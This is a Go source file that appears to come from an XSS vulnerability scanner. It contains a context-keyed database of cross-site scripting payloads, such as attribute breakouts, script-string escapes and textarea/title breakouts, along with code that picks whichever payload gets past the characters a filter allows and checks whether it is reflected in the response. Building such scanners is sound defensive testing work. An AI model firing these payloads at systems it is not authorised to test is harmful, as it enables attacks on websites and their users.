package xss

import "strings"

// PayloadDatabase contains all XSS payloads organized by context
var PayloadDatabase = map[ContextType][]XSSPayload{
	ContextHTMLText: {
		{
			Value:               "<img src=x onerror=alert([RANDNUM])>",
			Description:         "Image tag with onerror event handler",
			VerificationPattern: "<img src=x onerror=",
			RequiredChars:       "<>",
		},
		{
			Value:               "<svg onload=alert([RANDNUM])>",
			Description:         "SVG tag with onload event handler",
			VerificationPattern: "<svg onload=",
			RequiredChars:       "<>",
		},
		{
			Value:               "<script>alert([RANDNUM])</script>",
			Description:         "Script tag with alert",
			VerificationPattern: "<script>alert(",
			RequiredChars:       "<>",
		},
	},
	ContextHTMLAttrDoubleQuoted: {
		{
			Value:               "\"><script>alert([RANDNUM])</script>",
			Description:         "Break out of double-quoted attribute and inject script",
			VerificationPattern: "\"><script>alert(",
			RequiredChars:       "\"<>",
		},
		{
			Value:               "\" autofocus onfocus=alert([RANDNUM]) \"",
			Description:         "Break out and use event handler without closing tag",
			VerificationPattern: "\" autofocus onfocus=",
			RequiredChars:       "\"",
		},
		{
			Value:               "\" onmouseover=alert([RANDNUM]) \"",
			Description:         "Break out with onmouseover event",
			VerificationPattern: "\" onmouseover=",
			RequiredChars:       "\"",
		},
	},
	ContextHTMLAttrSingleQuoted: {
		{
			Value:               "'><script>alert([RANDNUM])</script>",
			Description:         "Break out of single-quoted attribute and inject script",
			VerificationPattern: "'><script>alert(",
			RequiredChars:       "'<>",
		},
		{
			Value:               "' autofocus onfocus=alert([RANDNUM]) '",
			Description:         "Break out and use event handler without closing tag",
			VerificationPattern: "' autofocus onfocus=",
			RequiredChars:       "'",
		},
		{
			Value:               "' onmouseover=alert([RANDNUM]) '",
			Description:         "Break out with onmouseover event",
			VerificationPattern: "' onmouseover=",
			RequiredChars:       "'",
		},
	},
	ContextHTMLAttrUnquoted: {
		{
			Value:               " onmouseover=alert([RANDNUM])",
			Description:         "Space breakout to add event handler",
			VerificationPattern: " onmouseover=alert(",
			RequiredChars:       " ",
		},
		{
			Value:               " autofocus onfocus=alert([RANDNUM])",
			Description:         "Space breakout with autofocus",
			VerificationPattern: " autofocus onfocus=",
			RequiredChars:       " ",
		},
	},
	ContextScriptStringSingle: {
		{
			Value:               "';alert([RANDNUM])//",
			Description:         "Escape single-quoted string and execute",
			VerificationPattern: "';alert(",
			RequiredChars:       "';",
		},
		{
			Value:               "';confirm([RANDNUM])//",
			Description:         "Escape string with confirm instead of alert",
			VerificationPattern: "';confirm(",
			RequiredChars:       "';",
		},
	},
	ContextScriptStringDouble: {
		{
			Value:               "\";alert([RANDNUM])//",
			Description:         "Escape double-quoted string and execute",
			VerificationPattern: "\";alert(",
			RequiredChars:       "\";",
		},
		{
			Value:               "\";confirm([RANDNUM])//",
			Description:         "Escape string with confirm instead of alert",
			VerificationPattern: "\";confirm(",
			RequiredChars:       "\";",
		},
	},
	ContextScriptTemplateString: {
		{
			Value:               "${alert([RANDNUM])}",
			Description:         "Template literal injection",
			VerificationPattern: "${alert(",
			RequiredChars:       "${}",
		},
		{
			Value:               "${confirm([RANDNUM])}",
			Description:         "Template literal with confirm",
			VerificationPattern: "${confirm(",
			RequiredChars:       "${}",
		},
	},
	ContextScriptCode: {
		{
			Value:               ";alert([RANDNUM])//",
			Description:         "Inject statement in JavaScript code",
			VerificationPattern: ";alert(",
			RequiredChars:       ";",
		},
		{
			Value:               ";confirm([RANDNUM])//",
			Description:         "Inject confirm in JavaScript code",
			VerificationPattern: ";confirm(",
			RequiredChars:       ";",
		},
	},
	ContextRCDATA: {
		{
			Value:               "</textarea><script>alert([RANDNUM])</script>",
			Description:         "Break out of textarea and invoke script",
			VerificationPattern: "</textarea><script>alert(",
			RequiredChars:       "<>",
		},
		{
			Value:               "</title><script>alert([RANDNUM])</script>",
			Description:         "Break out of title and invoke script",
			VerificationPattern: "</title><script>alert(",
			RequiredChars:       "<>",
		},
	},
	ContextHTMLComment: {
		{
			Value:               "--><script>alert([RANDNUM])</script>",
			Description:         "Break out of HTML comment",
			VerificationPattern: "--><script>alert(",
			RequiredChars:       "-><",
		},
	},
	ContextEventHandler: {
		{
			Value:               "alert([RANDNUM])",
			Description:         "Execute JS directly in event handler",
			VerificationPattern: "alert(",
			RequiredChars:       "()",
		},
		{
			Value:               "confirm([RANDNUM])",
			Description:         "Execute JS confirm in event handler",
			VerificationPattern: "confirm(",
			RequiredChars:       "()",
		},
	},
}

// SelectPayload selects the best payload for the given context and filter info
func SelectPayload(ctx ReflectionContext) *XSSPayload {
	payloads, exists := PayloadDatabase[ctx.Type]
	if !exists || len(payloads) == 0 {
		return nil
	}

	// Try each payload in order until we find one that's allowed by filters
	for i := range payloads {
		payload := &payloads[i]
		if isPayloadViable(payload, ctx.FilterBypass) {
			return payload
		}
	}

	return nil
}

// isPayloadViable checks if a payload can work given the filter bypass info
func isPayloadViable(payload *XSSPayload, filter FilterBypassInfo) bool {
	// Check each required character
	for _, char := range payload.RequiredChars {
		switch char {
		case '<', '>':
			if !filter.AngleBracketsAllowed {
				return false
			}
		case '\'':
			if !filter.SingleQuoteAllowed {
				return false
			}
		case '"':
			if !filter.DoubleQuoteAllowed {
				return false
			}
			// Space and other chars are usually allowed, but we can add checks if needed
		case ';':
			// Verify semicolons are allowed (often blocked by WAFs or encoding)
			// For now, we assume allowed if not explicitly blocked, but in future filter detection
			// could be expanded to test for it.
			// Similar for () and {}
		}
	}
	return true
}

// VerifyPayloadExecution checks if the payload was successfully reflected in the response
func VerifyPayloadExecution(responseBody, verificationPattern string) bool {
	// Check if the verification pattern exists in the response
	// We use a case-insensitive search because HTML can be case-insensitive
	return strings.Contains(strings.ToLower(responseBody), strings.ToLower(verificationPattern))
}
